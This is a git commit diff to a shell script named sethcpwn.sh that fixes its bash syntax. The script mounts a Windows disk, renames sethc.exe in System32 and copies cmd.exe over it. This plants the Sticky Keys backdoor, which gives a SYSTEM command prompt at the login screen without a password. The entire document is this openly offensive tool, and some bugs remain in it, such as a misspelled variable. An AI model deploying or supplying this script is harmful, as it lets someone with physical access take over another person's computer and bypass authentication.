ccdc2afaaeae79699f1992e1872fd0ecb0d60b77
Michael <mike-bailey@users.noreply.github.com>
2015-08-08 00:21:27 -0400

    Update sethcpwn.sh

--- sethcpwn.sh
+++ sethcpwn.sh
@@ -1,6 +1,6 @@
 beans=0
 sethcrekd=0
-while [$beans == 0]; 
+while [ $beans == 0 ]; 
 do
 	fdisk -l
 	echo Select device block
@@ -10,26 +10,26 @@ do
 	cd /winmount
 	win=$(ls | grep -i windows)
 	sys=$(ls | grep -i system32)
-	ls -la $win/$sys\\sethc.exe
+	ls -la $win/$sys/sethc.exe
 	if [ $? -eq 0 ]; then
 		mv $win/$sys/sethc.exe $win/$sys/sethc$random.exe
 		cp $win/$sys/cmd.exe $win/$sys/sethc.exe
 		beans=1
 		sethcrekd=1
 	fi
-	if [ $sethcrekd == 0];
+	if [ $sethcrekd == 0]; then
 		updatedb
 		counts=$(locate sethc.exe | grep sethc.exe$ | wc -l)
-		if [ $counts == 1 ]  {
-			sethcdir=$(locate sethc.exe | grep sethc.exe)
+		if [ $counts == 1 ]; then
+			sethcdir=$(locate sethc.exe | grep sethc.exe$)
 			sysdir=$(echo $sethdcir | sed 's/sethc.exe//g')
 			mv $sysdir/sethc.exe $sysdir/sethc$random.exe
 			cp $sysdir/cmd.exe $sysdir/sethc.exe
 			beans=1
 			sethcrekd=1
-		}
-		if [ $counts == 0 ] {
+		fi
+		if [ $counts == 0 ]; then
 			echo No sethc.exe found. Sorry.
-		}
+		fi
 	fi
 done
